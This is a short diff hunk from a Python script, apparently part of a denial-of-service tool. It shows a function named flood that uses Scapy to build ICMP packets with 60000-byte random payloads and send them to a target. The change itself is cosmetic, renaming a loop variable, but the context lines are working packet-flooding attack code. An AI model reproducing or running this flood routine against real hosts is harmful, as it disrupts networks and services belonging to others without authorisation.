@@ -10,7 +10,7 @@ def flood(target):
     payload = random.choice(__letters) * 60000
     packet = IP(dst=target[0]) / ICMP(id=65535, seq=65535) / payload
 
-    for i in range(4):
+    for _ in range(4):
         try:
             send(packet, verbose=False)
         except Exception as e:
